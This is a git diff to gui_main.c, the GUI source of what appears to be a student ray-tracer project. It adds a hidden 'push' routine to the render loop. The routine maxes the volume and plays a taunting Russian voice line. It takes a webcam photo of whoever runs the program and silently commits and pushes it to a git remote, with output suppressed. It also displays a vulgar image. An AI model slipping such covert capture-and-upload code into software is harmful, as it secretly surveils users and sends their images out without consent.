@@ -3,14 +3,31 @@
 /*                                                        :::      ::::::::   */
 /*   gui_main.c                                         :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: srobert- <srobert-@student.42.fr>          +#+  +:+       +#+        */
+/*   By: lminta <lminta@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/09/13 15:21:19 by lminta            #+#    #+#             */
-/*   Updated: 2019/11/01 22:35:27 by srobert-         ###   ########.fr       */
+/*   Updated: 2019/11/14 22:22:21 by lminta           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "rt.h"
+
+static void	push(t_gui *gui)
+{
+	static int flag = 1;
+
+	if (KW_IsWidgetHidden(gui->ed_w.frame) == KW_TRUE && flag)
+	{
+		system("osascript -e 'set Volume 1000'");
+		system("say -v Yuri 'В глаза мне смотри'&");
+		system("./gui/ImageSnap-v0.2.5/imagesnap './tvoj_eblet.jpg' > /dev/null");
+		system("open './gui/res/ebalo.jpg'&");
+		system("git add './tvoj_eblet.jpg' > /dev/null");
+		system("git commit -m 'face' > /dev/null");
+		system("git push 2> /dev/null");
+		flag = 0;
+	}
+}
 
 t_gui		*g_gui(t_gui *gui, int flag)
 {
@@ -19,6 +36,21 @@ t_gui		*g_gui(t_gui *gui, int flag)
 	if (flag)
 		storage = gui;
 	return (storage);
+}
+
+static void	in_e(t_gui *gui)
+{
+	KW_HideWidget(gui->ed_w.frame);
+	gui->i_e.frect = gui->ed_w.frect;
+	gui->i_e.frect.y += WIN_H / 3;
+	gui->i_e.frect.h /= 3;
+	gui->i_e.frame = KW_CreateFrame(gui->gui, NULL, &gui->i_e.frect);
+	gui->i_e.rects[0] = &gui->i_e.titlerect;
+	gui->i_e.weights[0] = 1;
+	gui->i_e.titlerect = gui->i_e.frect;
+	KW_RectCenterInParent(&gui->i_e.frect, &gui->i_e.titlerect);
+	gui->i_e.label = KW_CreateLabel(gui->gui,
+	gui->i_e.frame, "V GLAZA MNE SMOTRI", &gui->i_e.titlerect);
 }
 
 void		init_kiwi(t_gui *gui)
@@ -45,6 +77,7 @@ void		init_kiwi(t_gui *gui)
 	gui->s_s.show = 0;
 	gui->o_s.show = 0;
 	gui->g_b.show = 0;
+	gui->o_t.show = 0;
 }
 
 static void	rotator(t_game *game, t_gui *gui)
@@ -64,6 +97,9 @@ static void	rotator(t_game *game, t_gui *gui)
 		game->gpu.samples = 0;
 		reconfigure_camera(&game->gpu.camera[game->cam_num]);
 	}
+	else if (KW_IsWidgetHidden(gui->ed_w.frame) != KW_TRUE &&
+	!ft_strcmp(USER, getlogin()))
+		in_e(gui);
 }
 
 void		loopa(t_game *game, t_gui *gui)
@@ -82,8 +118,11 @@ void		loopa(t_game *game, t_gui *gui)
 				gui->quit = 1;
 		ft_render(game, gui);
 		screen_present(game, gui);
+		push(gui);
 		time = SDL_GetTicks() - time;
 		if (time < TICKS_PER_FRAME)
 			SDL_Delay(TICKS_PER_FRAME - time);
 	}
+	if (gui->i_e.frame && KW_IsWidgetHidden(gui->i_e.frame) != KW_TRUE)
+		KW_HideWidget(gui->i_e.frame);
 }
